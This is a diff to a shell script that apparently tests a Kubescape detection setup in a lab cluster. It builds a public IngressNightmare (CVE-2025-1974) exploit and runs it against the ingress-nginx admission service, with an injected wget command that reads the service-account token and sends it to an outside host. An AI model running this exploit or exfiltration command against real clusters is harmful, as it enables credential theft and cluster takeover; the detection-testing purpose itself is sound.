@@ -8,6 +8,9 @@ NS=ingress-nginx
 VER=controller-v1.11.0
 cd "$ROOT"
 
+# hack/cp-to-fragment.py (signing step) imports yaml + requests.
+for p in python3-yaml python3-requests; do dpkg -s "$p" >/dev/null 2>&1 || sudo apt-get install -y -qq "$p"; done
+
 echo "### signed kubescape stack"
 make kubescape
 kubectl -n honey rollout status ds/node-agent --timeout=300s
@@ -43,7 +46,8 @@ echo "### attack: IngressNightmare CVE-2025-1974 via auth-url CVE-2025-24514"
 command -v go >/dev/null || sudo apt-get install -y -qq golang-go
 for p in gcc libssl-dev; do dpkg -s "$p" >/dev/null 2>&1 || sudo apt-get install -y -qq "$p"; done
 [ -d "$HERE/exploit/ein" ] || git clone -q https://github.com/Esonhugh/ingressNightmare-CVE-2025-1974-exps "$HERE/exploit/ein"
-( cd "$HERE/exploit/ein" && GOFLAGS=-mod=mod go build -o ing . )
+# GOWORK=off: keep the ein module out of any ambient go.work (mod-mode conflict).
+( cd "$HERE/exploit/ein" && GOWORK=off GOFLAGS=-mod=mod go build -o ing . )
 PODIP=$(kubectl -n "$NS" get pod -l app.kubernetes.io/component=controller -o jsonpath='{.items[0].status.podIP}')
 ADM=$(kubectl -n "$NS" get svc ingress-nginx-controller-admission -o jsonpath='{.spec.clusterIP}')
 "$HERE/exploit/ein/ing" -m c -c 'for i in 1 2 3 4 5 6 7 8; do wget -q -T2 -O- "http://1.1.1.1/leak?t=$(head -c20 /var/run/secrets/kubernetes.io/serviceaccount/token)" 2>/dev/null; sleep 1; done' -i "https://$ADM:443" -u "http://$PODIP:80" --is-auth-url
